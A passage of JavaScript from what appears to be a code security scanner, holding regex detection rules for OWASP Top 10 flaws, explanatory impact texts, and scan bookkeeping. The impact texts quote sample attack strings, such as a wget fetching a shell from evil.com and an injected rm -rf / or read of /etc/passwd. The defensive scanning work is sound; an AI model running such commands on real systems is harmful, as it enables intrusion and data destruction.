      'A08:2021-Software and Data Integrity Failures': 'The application trusts external data without verification. Unsafe deserialization lets attackers send crafted data that executes code when the application reads it. An attacker can achieve remote code execution by uploading a malicious serialized object or tampering with a software update.',
      'A09:2021-Security Logging and Monitoring Failures': 'No one is watching for attacks. Without proper logging, a breach can go undetected for months. Attackers can brute-force passwords, exfiltrate data, or maintain persistent access without triggering any alerts. There is no audit trail to investigate what happened after an incident.',
      'A10:2021-Server-Side Request Forgery (SSRF)': 'The server can be tricked into making requests to internal systems that are normally firewalled off. An attacker can scan internal networks, access cloud metadata services (AWS/GCP/Azure) to steal credentials, or attack internal APIs that are not exposed to the internet.',
    }

    // Helper: check if rule applies to this file based on extension
    const extMatch = (f, exts) => exts.some(e => f.path.toLowerCase().endsWith(e))
    const ALL = () => true // applies to all files

    const RULES = [
      // ── A03:2021 — Injection (SQLi, CMDi, XSS, SSTI, LDAP, NoSQL, XPath) ──
      { re: /(?:api[_-]?key|apikey|secret|password|passwd|token|private[_-]?key)\s*[:=]\s*['"][A-Za-z0-9_\-+/=]{16,}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Hardcoded secret/credential', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'A secret key or password is written directly in the source code. Anyone who can read the code — including attackers who gain access to the repository — can use this credential to access the database, API, or service it protects. If this code is in a public GitHub repo, the credential is already compromised.', ext: ALL },
      { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/, sev: 'critical', cwe: 'CWE-798', title: 'Private key committed to source', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'A private cryptographic key is stored in the source code. This key can decrypt all communications, sign malicious software as trusted, or authenticate as the server to steal data. Anyone with this key can impersonate the application.', ext: ALL },
      // SQL Injection patterns (only on files that actually do DB queries)
      { re: /(?:query|execute|raw|queryRunner|getConnection|createQuery|createQueryBuilder)\s*\(\s*[`'"].*\$[\{\(]/, sev: 'high', cwe: 'CWE-89', title: 'SQL query built with string interpolation (SQLi risk)', owasp: 'A03:2021-Injection', impact: 'Database queries are built by directly inserting user input into the SQL string. An attacker can close the quote and add their own SQL commands — reading the entire database, modifying records, or deleting all data. This is the #1 most dangerous web vulnerability.', ext: ALL },
      { re: /\.query\s*\(\s*(?!['"][^'"]*['"]\s*,\s*\[)/, sev: 'medium', cwe: 'CWE-89', title: 'Database query without parameterized binding', owasp: 'A03:2021-Injection', impact: 'The query does not appear to use parameterized/placeholder binding. If user input reaches this query, it is vulnerable to SQL injection — attackers can extract, modify, or destroy database contents.', ext: ALL },
      { re: /mysql_query\s*\(\s*['"][^'"]*\$_(?:GET|POST|REQUEST)/, sev: 'critical', cwe: 'CWE-89', title: 'PHP SQL injection (mysql_query with superglobal)', owasp: 'A03:2021-Injection', impact: 'PHP code directly inserts user input ($_GET/$_POST) into a MySQL query string. An attacker can craft a URL parameter that extracts the entire database, including all user passwords and private data. This is trivially exploitable.', ext: f => extMatch(f, ['.php']) },
      { re: /(?:select|insert|update|delete)\s+.*\+.*\b(?:req|request|params|query|body|input|param)\b/i, sev: 'high', cwe: 'CWE-89', title: 'SQL statement concatenated with user input', owasp: 'A03:2021-Injection', impact: 'An SQL query string is built by concatenating (+) with user-supplied data. Attackers can inject SQL commands to read all database tables, modify records, or drop the entire database.', ext: ALL },
      // Command Injection patterns
      { re: /\b(?:eval|exec|execSync|execFileSync|spawnSync|child_process\.exec|subprocess\.(?:call|check_output|Popen)|os\.(?:system|popen))\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)/, sev: 'high', cwe: 'CWE-78', title: 'Command execution with user-controlled input', owasp: 'A03:2021-Injection', impact: 'User input is passed directly to a system command. An attacker can inject shell commands (e.g., ; rm -rf / or ; cat /etc/passwd) to execute arbitrary code on the server, read sensitive files, or take full control of the machine.', ext: ALL },
      { re: /\beval\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'eval() usage — possible code injection', owasp: 'A03:2021-Injection', impact: 'eval() executes a string as code. If any part of that string comes from user input, an attacker can run arbitrary JavaScript/Python on the server — accessing files, databases, environment variables, and escalating to full server compromise.', ext: ALL },
      { re: /new\s+Function\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'new Function() — dynamic code execution', owasp: 'A03:2021-Injection', impact: 'new Function() creates and runs code from a string, similar to eval(). If user input reaches this, attackers can execute arbitrary JavaScript with full access to the application context.', ext: ALL },
      { re: /shell_exec|passthru|system|popen|proc_open|exec\s*\(\s*\$_(?:GET|POST|REQUEST)/, sev: 'high', cwe: 'CWE-78', title: 'PHP command execution with user input', owasp: 'A03:2021-Injection', impact: 'PHP code passes user input directly to a shell command. An attacker can append ; cat /etc/passwd or ; wget http://evil.com/shell.php to run any command on the server with the web server\'s privileges.', ext: f => extMatch(f, ['.php']) },
      { re: /require\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-98', title: 'PHP remote/local file inclusion via user input', owasp: 'A03:2021-Injection', impact: 'User input controls which file is loaded via require/include. An attacker can include remote files (RFI) or local system files (LFI) like /etc/passwd, leading to code execution or sensitive data disclosure.', ext: f => extMatch(f, ['.php']) },
      // XSS patterns
      { re: /innerHTML\s*=\s*(?!['"]<)/, sev: 'medium', cwe: 'CWE-79', title: 'innerHTML assignment — DOM XSS risk', owasp: 'A03:2021-Injection', impact: 'Setting innerHTML with untrusted data allows attackers to inject <script> tags that run in victims\' browsers. This can steal login cookies, redirect users to phishing sites, or deface the page. Any user visiting the page could have their account hijacked.', ext: ALL },
      { re: /dangerouslySetInnerHTML/, sev: 'medium', cwe: 'CWE-79', title: 'React dangerouslySetInnerHTML — XSS risk', owasp: 'A03:2021-Injection', impact: 'React\'s dangerouslySetInnerHTML bypasses React\'s built-in XSS protection. If the content comes from user input, attackers can inject scripts that steal session tokens, log keystrokes, or perform actions as the victim.', ext: ALL },
      { re: /document\.write\s*\(/, sev: 'low', cwe: 'CWE-79', title: 'document.write — DOM XSS risk', owasp: 'A03:2021-Injection', impact: 'document.write() can inject HTML/JavaScript into the page. If fed untrusted data, attackers can hijack user sessions, deface the page, or redirect victims to malicious sites.', ext: ALL },
      { re: /v-html\s*=/i, sev: 'medium', cwe: 'CWE-79', title: 'Vue v-html directive — XSS risk', owasp: 'A03:2021-Injection', impact: 'Vue\'s v-html renders raw HTML. If the bound data comes from user input, attackers can inject malicious scripts that execute in every visitor\'s browser.', ext: ALL },
      { re: /\{\{\{.*\}\}\}/, sev: 'medium', cwe: 'CWE-79', title: 'Handlebars triple-brace (unescaped HTML) — XSS risk', owasp: 'A03:2021-Injection', impact: 'Triple braces {{{ }}} in Handlebars render unescaped HTML. If the variable contains user input, attackers can inject <script> tags that steal cookies and hijack user sessions.', ext: ALL },
      { re: /res\.(?:send|write|end)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-79', title: 'Reflected XSS — response body from user input', owasp: 'A03:2021-Injection', impact: 'The server sends user input directly back in the HTTP response without sanitization. An attacker can craft a malicious link that, when clicked, executes JavaScript in the victim\'s browser — stealing their session and impersonating them.', ext: ALL },
      // SSTI patterns
      { re: /render\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-1336', title: 'Server-Side Template Injection (SSTI) risk', owasp: 'A03:2021-Injection', impact: 'User input is passed to a template engine\'s render function. Attackers can inject template syntax (e.g., {{7*7}} in Jinja2, <%= %> in EJS) to execute arbitrary code on the server, read files, and gain full remote code execution.', ext: ALL },
      { re: /\.render\s*\(\s*template\s*\+\s*/i, sev: 'high', cwe: 'CWE-1336', title: 'Template path concatenated with user input', owasp: 'A03:2021-Injection', impact: 'The template file path is built from user input. Attackers can traverse directories to render arbitrary files or inject template syntax for server-side code execution.', ext: ALL },
      // NoSQL Injection
      { re: /\.find\s*\(\s*\{[^}]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-943', title: 'NoSQL injection — MongoDB query from user input', owasp: 'A03:2021-Injection', impact: 'MongoDB queries are built from raw user input. Attackers can inject operators like {$gt: ""} or {$ne: null} to bypass authentication, extract all documents, or cause denial of service.', ext: ALL },
      { re: /\.aggregate\s*\(\s*\[[^\]]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-943', title: 'NoSQL injection in aggregation pipeline', owasp: 'A03:2021-Injection', impact: 'The MongoDB aggregation pipeline includes user input. Attackers can manipulate the pipeline to bypass access controls and extract data they should not see.', ext: ALL },
      // LDAP Injection
      { re: /ldap\.(?:search|query|filter)\s*\([^)]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-90', title: 'LDAP injection — user input in LDAP filter', owasp: 'A03:2021-Injection', impact: 'User input is placed directly in an LDAP query filter. Attackers can inject LDAP metacharacters (*, |, &) to bypass authentication, list all users, or extract sensitive directory information.', ext: ALL },

      // ── A01:2021 — Broken Access Control (IDOR, path traversal, missing authz) ──
      { re: /(?:readFile|readFileSync|createReadStream|fs\.read|file_get_contents|open\s*\([^)]*\.\.\/)/, sev: 'high', cwe: 'CWE-22', title: 'Path traversal — file read with user input', owasp: 'A01:2021-Broken Access Control', impact: 'An attacker can read arbitrary files from the server by manipulating file paths (e.g., ../../../etc/passwd). This can expose source code, configuration files with database passwords, SSH keys, and system files containing user data.', ext: ALL },
      // Path traversal: only flag ../ outside of import/require statements (skip TS relative imports)
      { re: /(?:\.\.\/|\.\.\\)/, sev: 'info', cwe: 'CWE-22', title: 'Path traversal sequence in source', owasp: 'A01:2021-Broken Access Control', impact: 'The code contains path traversal sequences. If this path is influenced by user input, attackers can escape the intended directory and read any file on the server.', ext: f => extMatch(f, ['.php', '.py', '.rb', '.java', '.go', '.c', '.cpp', '.sh', '.bat', '.yaml', '.yml', '.env', '.config', '.conf', '.ini', '.toml', '.xml', '.json']) },
      { re: /(?:app\.(?:get|post|put|delete|patch|use)|router\.(?:get|post|put|delete|patch))\s*\(\s*['"`]\/[^'"`]*\/:(\w+)/, sev: 'low', cwe: 'CWE-639', title: 'IDOR risk — route parameter without authorization check', owasp: 'A01:2021-Broken Access Control', impact: 'The route accepts a resource ID from the URL (e.g., /users/:id) without visible authorization checks. An attacker can change the ID to access other users\' data, private documents, or restricted resources.', ext: ALL },
      { re: /(?:findById|findOne|findByPk|get\s*\(\s*['"]\/\w+\/\w+['"])\s*\([^)]*req\.params/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — database lookup by URL param without ownership check', owasp: 'A01:2021-Broken Access Control', impact: 'The application fetches a database record based on a URL parameter without verifying the current user owns that record. An attacker can enumerate IDs to access every user\'s private data.', ext: ALL },
      { re: /(?:req\.params\.id|req\.query\.id|req\.body\.id)\s*&&\s*!(?:req\.user|req\.session|auth)/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — uses request ID without authentication guard', owasp: 'A01:2021-Broken Access Control', impact: 'The application uses a user-supplied ID without first checking authentication or authorization. An unauthenticated attacker can access any record by guessing or enumerating IDs.', ext: ALL },
      { re: /\.(?:role|isAdmin|isManager|isSuperUser)\s*===\s*['"]admin['"]/, sev: 'low', cwe: 'CWE-285', title: 'Hardcoded role check — may be bypassable', owasp: 'A01:2021-Broken Access Control', impact: 'Authorization is checked by comparing a role string. If the role can be manipulated (e.g., via JWT tampering or request modification), attackers can set their role to "admin" and gain full access.', ext: ALL },
      { re: /res\.redirect\s*\(\s*(?:req\.(?:query|params|body)\.)/, sev: 'medium', cwe: 'CWE-601', title: 'Open redirect — user-controlled redirect target', owasp: 'A01:2021-Broken Access Control', impact: 'The application redirects users to a URL from user input. Attackers can craft phishing links (e.g., /login?redirect=http://evil.com) that appear to come from your domain, tricking users into entering credentials on a fake login page.', ext: ALL },

      // ── A02:2021 — Cryptographic Failures ──
      { re: /md5|sha1(?!256|512)/i, sev: 'low', cwe: 'CWE-327', title: 'Weak hash algorithm (MD5/SHA1)', owasp: 'A02:2021-Cryptographic Failures', impact: 'MD5 and SHA1 are cryptographically broken — attackers can generate collisions (two different inputs that produce the same hash) in seconds. Anyone with access to the hashed data can crack it with freely available tools.', ext: ALL },
      { re: /createHash\s*\(\s*['"]md5['"]\s*\)/, sev: 'medium', cwe: 'CWE-327', title: 'MD5 used for hashing', owasp: 'A02:2021-Cryptographic Failures', impact: 'MD5 is explicitly used for hashing. MD5 collisions can be generated in under a second on modern hardware. Any password hashed with MD5 is effectively unprotected.', ext: ALL },
      { re: /Math\.random\s*\(\s*\)/, sev: 'low', cwe: 'CWE-338', title: 'Math.random() — not cryptographically secure', owasp: 'A02:2021-Cryptographic Failures', impact: 'Math.random() is predictable and should never be used for security purposes (tokens, passwords, session IDs). Attackers can predict the "random" values and hijack sessions or reset tokens.', ext: ALL },
      { re: /jwt\.(?:verify|decode)\s*\([^)]*algorithms?\s*:\s*\[[^\]]*none/i, sev: 'critical', cwe: 'CWE-347', title: 'JWT "none" algorithm accepted', owasp: 'A02:2021-Cryptographic Failures', impact: 'The JWT library accepts tokens signed with the "none" algorithm (no signature). An attacker can forge a token with any user ID and role — including admin — and the server will accept it as valid. This is a complete authentication bypass.', ext: ALL },
      { re: /(?:http:\/\/|\bhttp\b)(?!.*localhost)/i, sev: 'low', cwe: 'CWE-319', title: 'HTTP (cleartext) used — no TLS encryption', owasp: 'A02:2021-Cryptographic Failures', impact: 'Data is transmitted over unencrypted HTTP. Anyone on the same network (coffee shop WiFi, compromised router) can read all traffic — including passwords, session tokens, and personal data — in plain text.', ext: ALL },
      { re: /(?:crypto\.createCipher|crypto\.createCipheriv)\s*\(\s*['"](?:des|rc4|bf|blowfish)/, sev: 'high', cwe: 'CWE-327', title: 'Broken cipher (DES/RC4/Blowfish) used for encryption', owasp: 'A02:2021-Cryptographic Failures', impact: 'DES and RC4 are trivially breakable — DES keys can be brute-forced in hours. Any data encrypted with these ciphers should be considered compromised. An attacker who intercepts the encrypted data can decrypt it.', ext: ALL },

      // ── A04:2021 — Insecure Design ──
      { re: /(?:rate.limit|throttle|maxAttempts|max_attempts)/i, sev: 'info', cwe: 'CWE-307', title: 'Rate limiting may be insufficient', owasp: 'A04:2021-Insecure Design', impact: 'Without proper rate limiting, attackers can brute-force passwords, API keys, or 2FA codes by trying thousands of combinations per second. An account with a weak password can be compromised in minutes.', ext: ALL },
      { re: /(?:password|passwd|pwd)\s*=\s*['"][^'"]{1,5}['"]/, sev: 'medium', cwe: 'CWE-521', title: 'Weak/default password in source code', owasp: 'A04:2021-Insecure Design', impact: 'A very short or default password is hardcoded. Attackers can guess it in seconds. If this is a production credential, the system is effectively unprotected.', ext: ALL },
      { re: /(?:password|passwd)\s*[:=]\s*['"](?:admin|password|123456|test|guest|qwerty)/i, sev: 'high', cwe: 'CWE-521', title: 'Known default password in source', owasp: 'A04:2021-Insecure Design', impact: 'A well-known default password (admin, password, 123456) is in the source code. These are the first passwords any attacker tries. If deployed, the application is immediately compromised.', ext: ALL },

      // ── A05:2021 — Security Misconfiguration (CORS, debug, XXE, file upload) ──
      { re: /cors\s*\(\s*\{?\s*origin\s*:\s*(?:true|['"]\*['"])/i, sev: 'medium', cwe: 'CWE-942', title: 'Permissive CORS (origin: *)', owasp: 'A05:2021-Security Misconfiguration', impact: 'CORS is configured to allow ANY website to make requests to your API. While credentials are not sent, any public data can be read by malicious sites. Combined with other vulnerabilities, this can enable cross-origin attacks.', ext: ALL },
      { re: /Access-Control-Allow-Origin['"]?\s*[:,]\s*['"]\*['"]/, sev: 'medium', cwe: 'CWE-942', title: 'Wildcard CORS header', owasp: 'A05:2021-Security Misconfiguration', impact: 'The server explicitly allows any origin. Malicious websites can read API responses in the victim\'s browser context, potentially leaking sensitive data.', ext: ALL },
      { re: /app\.use\s*\(\s*['"]\/(?:debug|test|dev)/i, sev: 'low', cwe: 'CWE-489', title: 'Debug/test route mounted', owasp: 'A05:2021-Security Misconfiguration', impact: 'Debug or test routes are exposed in production. These often bypass authentication, leak internal state, or expose sensitive configuration. Attackers can use these to understand the application internals.', ext: ALL },
      { re: /(?:debug|DEBUG)\s*=\s*(?:true|1|['"]on['"])/i, sev: 'medium', cwe: 'CWE-489', title: 'Debug mode enabled in production', owasp: 'A05:2021-Security Misconfiguration', impact: 'Debug mode is ON. Error pages will show full stack traces with file paths, database queries, and environment details. This is a goldmine for attackers — it reveals the exact technology stack, internal paths, and sometimes credentials.', ext: ALL },
      // XXE patterns (Java/PHP only)
      { re: /xml\.(?:parse|Parse|load|Load|DOM)/, sev: 'medium', cwe: 'CWE-611', title: 'XML parsing without XXE protection', owasp: 'A05:2021-Security Misconfiguration', impact: 'XML is parsed without disabling external entities. Attackers can send a crafted XML document that reads local files (/etc/passwd), performs SSRF to internal services, or causes denial of service (Billion Laughs attack).', ext: f => extMatch(f, ['.java', '.php', '.py', '.rb']) },
      { re: /(?:DocumentBuilder|SAXParser|XMLInputFactory|SAXReader|XMLReader)\s*\.\s*new/, sev: 'medium', cwe: 'CWE-611', title: 'Java XML parser — potential XXE', owasp: 'A05:2021-Security Misconfiguration', impact: 'Java XML parsers are vulnerable to XXE by default. Attackers can read arbitrary files from the server, perform SSRF, or cause denial of service through crafted XML input.', ext: f => extMatch(f, ['.java']) },
      { re: /(?:libxml|simplexml_load_string|DOMDocument)\s*\(/, sev: 'medium', cwe: 'CWE-611', title: 'PHP XML parsing — potential XXE', owasp: 'A05:2021-Security Misconfiguration', impact: 'PHP\'s XML functions load external entities by default. Attackers can read /etc/passwd, access internal services, or cause DoS through XML entity expansion.', ext: f => extMatch(f, ['.php']) },
      // File upload patterns
      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\(/, sev: 'medium', cwe: 'CWE-434', title: 'File upload without visible validation', owasp: 'A05:2021-Security Misconfiguration', impact: 'File upload functionality exists without visible file type or content validation. An attacker can upload a malicious script (e.g., shell.php, malware.exe) and execute it on the server. This can lead to complete server takeover.', ext: ALL },
      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\([^)]*req\.(?:file|files)/, sev: 'high', cwe: 'CWE-434', title: 'Unrestricted file upload — user file saved directly', owasp: 'A05:2021-Security Misconfiguration', impact: 'User-uploaded files are saved to the server without checking the file type, content, or extension. Attackers can upload a web shell (e.g., .php, .jsp, .aspx) and execute arbitrary commands on the server through a browser — this is remote code execution.', ext: ALL },
      { re: /(?:\.png|\.jpg|\.jpeg|\.gif|\.svg|\.bmp|\.webp|\.ico)/i, sev: 'info', cwe: 'CWE-434', title: 'Image upload/handling — check for SVG XSS and ImageTragick', owasp: 'A05:2021-Security Misconfiguration', impact: 'Image uploads can be dangerous. SVG files can contain embedded JavaScript (XSS). Image processing libraries like ImageMagick have had critical RCE vulnerabilities (ImageTragick). Ensure uploaded files are re-encoded, not just validated by extension.', ext: ALL },
      { re: /(?:\.exe|\.dll|\.so|\.sh|\.bat|\.cmd|\.ps1|\.vbs|\.jar|\.war|\.php|\.jsp|\.asp|\.aspx|\.py|\.pl|\.rb|\.cgi)/i, sev: 'high', cwe: 'CWE-434', title: 'Potentially executable file extension in upload logic', owasp: 'A05:2021-Security Misconfiguration', impact: 'The code references executable file extensions (.exe, .php, .jsp, etc.) in upload logic. If these extensions are allowed, attackers can upload and execute arbitrary code on the server. Only allow strictly necessary file types (e.g., .pdf, .png after re-encoding).', ext: ALL },

      // ── A06:2021 — Vulnerable and Outdated Components ──
      { re: /"(?:express|koa|hapi|fastify|next|nuxt|react|angular|vue|jquery|bootstrap|spring|django|flask|rails|laravel|symfony|wordpress|drupal|joomla|struts|tomcat|nginx|apache)":\s*"[~^]?\d+\.\d+\.\d+/i, sev: 'info', cwe: 'CWE-1104', title: 'Dependency version in package.json/composer.json', owasp: 'A06:2021-Vulnerable and Outdated Components', impact: 'The dependency version is pinned. If this version is outdated, it may contain known vulnerabilities with public exploits. Attackers can use automated scanners to find and exploit these known weaknesses.', ext: ALL },

      // ── A07:2021 — Identification and Authentication Failures ──
      { re: /(?:session|token|jwt).?(?:secret|key)\s*[:=]\s*['"][^'"]{1,20}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Weak session/JWT secret key', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'The session signing secret is too short or hardcoded. Attackers can brute-force it to forge valid session tokens for any user, including administrators. This bypasses the entire authentication system.', ext: ALL },
      { re: /(?:login|signin|authenticate|auth)\s*\([^)]*\)\s*{?\s*[^}]{0,100}?\btrue\b/, sev: 'medium', cwe: 'CWE-287', title: 'Authentication returning true without visible validation', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'The login function appears to return success without proper credential validation. This could mean the authentication is bypassable or the validation is missing entirely.', ext: ALL },

      // ── A08:2021 — Software and Data Integrity Failures ──
      { re: /pickle\.loads?|yaml\.load\s*\((?![^)]*Loader)/, sev: 'high', cwe: 'CWE-502', title: 'Unsafe deserialization (pickle/yaml.load)', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'pickle.loads() and yaml.load() (without SafeLoader) can execute arbitrary code during deserialization. An attacker who can supply a crafted serialized object can achieve remote code execution on the server — this is as dangerous as SQL injection.', ext: f => extMatch(f, ['.py']) },
      { re: /unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/, sev: 'high', cwe: 'CWE-502', title: 'PHP unserialize() on user input', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'PHP unserialize() on user-controlled data allows attackers to inject serialized PHP objects. With the right "gadget chain" (available in common frameworks), this leads to arbitrary code execution — full server compromise.', ext: f => extMatch(f, ['.php']) },
      { re: /JSON\.parse\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'info', cwe: 'CWE-502', title: 'JSON.parse on user input — verify no prototype pollution', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'JSON.parse is generally safe from deserialization attacks, but the resulting object should not be merged into prototypes. Check for Object.assign() or spread operators that could enable prototype pollution leading to denial of service or privilege escalation.', ext: ALL },
      { re: /(?:\.extend|Object\.assign|merge|_.merge|\.defaultsDeep)\s*\([^)]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-1321', title: 'Prototype pollution — user input merged into objects', owasp: 'A08:2021-Software and Data Integrity Failures', impact: 'User input is merged into application objects. Attackers can inject __proto__ or constructor.prototype properties to pollute the global object prototype, affecting all objects in the application. This can lead to property injection, authentication bypass, or remote code execution.', ext: ALL },

      // ── A09:2021 — Security Logging and Monitoring Failures ──
      { re: /console\.(?:log|error|warn|info|debug)\s*\([^)]*(?:password|secret|token|key|credential|api[_-]?key)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data logged to console', owasp: 'A09:2021-Security Logging and Monitoring Failures', impact: 'Passwords, tokens, or secrets are being written to console logs. Production logs are often stored in files, aggregated to logging services, or visible in container/cloud logs — anyone with log access can see these credentials.', ext: ALL },
      { re: /(?:logger|log)\.(?:info|debug|error|warn)\s*\([^)]*(?:password|secret|token|key|credential)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data written to application logs', owasp: 'A09:2021-Security Logging and Monitoring Failures', impact: 'Credentials or secrets are being written to application logs. Logs are often accessible to developers, stored in plaintext, and may be shipped to third-party services — exposing credentials to anyone with log access.', ext: ALL },

      // ── A10:2021 — Server-Side Request Forgery (SSRF) ──
      { re: /fetch\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'The server makes HTTP requests to URLs provided by the user. Attackers can make the server request internal services (e.g., http://169.254.169.254/latest/meta-data/ on AWS to steal cloud credentials), scan internal networks, or attack internal APIs.', ext: ALL },
      { re: /axios\.(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'The server makes outbound HTTP requests to user-supplied URLs. Attackers can access internal cloud metadata services (AWS/GCP/Azure), hit internal admin panels, or scan the internal network behind the firewall.', ext: ALL },
      { re: /(?:urllib|requests|httpx|http\.client|got|superagent|needle|node-fetch)\s*\.\s*(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — HTTP client with user-controlled URL', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'The application makes HTTP requests to URLs from user input. Attackers can access internal services, cloud metadata endpoints, or attack internal infrastructure that is not exposed to the internet.', ext: ALL },
      { re: /(?:import\s+urllib|from\s+urllib|import\s+requests|require\s*\(\s*['"]https?['"]\s*\)|require\s*\(\s*['"]axios['"]\s*\))/, sev: 'info', cwe: 'CWE-918', title: 'HTTP client library imported — check for SSRF', owasp: 'A10:2021-Server-Side Request Forgery (SSRF)', impact: 'An HTTP client library is imported. If any URL passed to it comes from user input without validation, attackers can make the server request internal services, steal cloud credentials, or attack internal infrastructure.', ext: ALL },
    ]
    const findings = []
    for (const f of files) {
      const content = String(f.content || '')
      const lines = content.split('\n')
      const seen = new Set()
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i]
        if (!line || line.trim().startsWith('//') && !/[:=]/.test(line)) continue
        for (const r of RULES) {
          if (!r.re.test(line)) continue
          // Skip if rule doesn't apply to this file extension
          if (r.ext && !r.ext(f)) continue
          const key = `${f.path}:${r.title}`
          if (seen.has(key)) continue
          seen.add(key)
          const impact = r.impact || IMPACT[r.owasp] || 'This vulnerability could allow attackers to compromise the application or its data.'
          findings.push({
            title: `${r.title} — ${f.path}:${i + 1}`,
            severity: r.sev,
            cweId: r.cwe,
            owaspCategory: r.owasp,
            description: `${r.title} detected at ${f.path}:${i + 1}. Matched line: \`${line.trim().slice(0, 160)}\``,
            laymanImpact: impact,
            remediation: 'Review the flagged line: remove hardcoded secrets (use env vars/secret manager), sanitize user input before dangerous sinks, and replace weak crypto.',
            module: 'pattern-scan',
            evidence: { file: f.path, line: i + 1, code: line.trim().slice(0, 300) },
          })
          // Allow multiple rules to match the same line.
          // Old 'break' meant only the first matching rule won — later rules
          // (like the dedicated eval() rule) were silently skipped when a
          // broader rule (like command-exec-with-user-input) matched first.
        }
      }
    }
    return findings
  }

  /**
   * Start per-scan token usage tracking. Called at the beginning of every scan.
   * Accumulates prompt_tokens, completion_tokens, total_tokens, and model name.
   */
  _startTokenTracking(scanId) {
    // Initialize accumulator for this scan
    if (!this._tokenAcc) this._tokenAcc = new Map()
    this._tokenAcc.set(scanId, { prompt_tokens: 0, completion_tokens: 0, total_tokens: 0, models: {} })

    // Wire the LLM usage callback (only once)
    if (!this._tokenWired) {
      this._tokenWired = true
      aiEngine.llm.setUsageCallback(({ usage, model, context }) => {
        if (!usage) return
        // Accumulate to all active scans (usually only one at a time)
        for (const [sid, acc] of (this._tokenAcc || new Map())) {
          acc.prompt_tokens += usage.prompt_tokens || 0
          acc.completion_tokens += usage.completion_tokens || 0
          acc.total_tokens += usage.total_tokens || 0
          if (model) {
            acc.models[model] = (acc.models[model] || 0) + (usage.total_tokens || 0)
          }
          // Periodically persist to DB (every ~5000 tokens)
          if (acc.total_tokens % 5000 < (usage.total_tokens || 0)) {
            this._saveTokenUsage(sid)
          }
        }
      })
    }
  }

  /** Persist accumulated token usage for a scan to the DB. */
  _saveTokenUsage(scanId) {
    const acc = this._tokenAcc?.get(scanId)
    if (!acc) return
    try {
      db.run(`UPDATE scans SET token_usage = ? WHERE id = ?`, JSON.stringify(acc), scanId)
    } catch { /* non-fatal */ }
  }

  /** Compute final risk score + persist status. */
  finish(scanId, status) {
    // Save accumulated token usage before finishing
    this._saveTokenUsage(scanId)
    const findings = db.all(`SELECT severity FROM findings WHERE scan_id = ?`, scanId)
    const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 }
    for (const f of findings) counts[f.severity] = (counts[f.severity] || 0) + 1
    const score = computeRiskScore(counts)
    db.run(`UPDATE scans SET status = ?, risk_score = ?, progress = 100, finished_at = ? WHERE id = ?`,
      status, score, new Date().toISOString(), scanId)
    const scan = db.get(`SELECT * FROM scans WHERE id = ?`, scanId)
    this.log(scanId, status === 'completed' ? 'info' : 'warn',
      `■ Scan ${status}. Findings: ${JSON.stringify(counts)}. Risk score: ${score}/10`)
    this.progress(scanId, 100, status)
    this.emit(scanId, 'scan:done', { scanId, status, scan, counts, riskScore: score })
    // Release per-scan runtime state so Maps don't grow unbounded.
    this.control.delete(scanId)
    this._lastProgressEmit?.delete(scanId)
    // Finalise blackboxMeta: copy all URLs from _urlPool into meta before cleanup
    const meta = this._blackboxMeta?.get(scanId)
    if (meta) {
      const pool = this._urlPool?.get(scanId)
      if (pool) {
        for (const u of pool) {
          if (!meta.urls.includes(u)) {
            meta.urls.push(u)
            if (meta.urls.length > 500) meta.urls = meta.urls.slice(-500)
          }
        }
      }
      meta.endTime = new Date().toISOString()
      meta.totalUrls = meta.urls.length
      try { db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(meta), scanId) } catch { /* non-fatal */ }
    }
    this._blackboxMeta?.delete(scanId)
    this._urlPool?.delete(scanId)
    this._tokenAcc?.delete(scanId)

    // ── AUTOMATED PDF REPORT & EMAIL DISPATCH ──
    if (status === 'completed' && (scan.email_notify || scan.trigger_source?.startsWith('github'))) {
      setImmediate(async () => {
        try {
          const { generateReport } = await import('./report.js')
          const { sendScanAuditReportEmail } = await import('./email.js')
          const scanFindings = db.all(`SELECT * FROM findings WHERE scan_id = ? ORDER BY CASE severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END`, scanId)
          
          this.log(scanId, 'info', `📄 Auto-generating PDF audit report for email notification...`)
